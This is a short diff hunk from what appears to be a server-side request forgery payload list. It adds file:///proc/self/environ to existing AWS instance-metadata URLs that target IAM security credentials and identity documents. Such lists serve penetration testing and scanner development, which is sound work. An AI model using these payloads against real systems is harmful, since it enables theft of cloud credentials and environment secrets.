@@ -12,3 +12,4 @@ http://169.254.169.254/latest/dynamic/instance-identity/document
 http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
 http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/
 http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+file:///proc/self/environ
